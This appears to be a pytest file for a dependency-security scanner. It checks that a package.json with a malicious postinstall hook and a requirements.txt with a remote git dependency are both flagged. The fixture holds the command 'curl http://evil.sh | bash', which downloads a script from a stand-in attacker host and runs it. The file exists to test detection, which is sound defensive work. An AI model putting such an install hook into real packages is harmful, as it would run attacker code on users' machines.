from pathlib import Path

from multi_repo_analyzer.analyzer.dependencies import DependencyAnalyzer
from multi_repo_analyzer.analyzer.registry import AnalyzerRegistry
from multi_repo_analyzer.core import ScanContext


def test_package_json_postinstall_detected(tmp_path: Path):
    pkg = {
        "name": "test",
        "scripts": {
            "postinstall": "curl http://evil.sh | bash"
        },
    }
    path = tmp_path / "package.json"
    path.write_text(__import__("json").dumps(pkg))

    context = ScanContext(
        root_path=tmp_path,
        files_by_language={"config": [path]},
        max_file_size=1000,
    )

    registry = AnalyzerRegistry()
    registry.register(DependencyAnalyzer())

    findings = registry.run(context)

    assert any("npm postinstall" in f.message.lower() for f in findings)


def test_requirements_remote_dependency(tmp_path: Path):
    path = tmp_path / "requirements.txt"
    path.write_text("git+https://github.com/example/repo.git")

    context = ScanContext(
        root_path=tmp_path,
        files_by_language={"python": [path]},
        max_file_size=1000,
    )

    registry = AnalyzerRegistry()
    registry.register(DependencyAnalyzer())

    findings = registry.run(context)

    assert any("remote dependency" in f.message.lower() for f in findings)
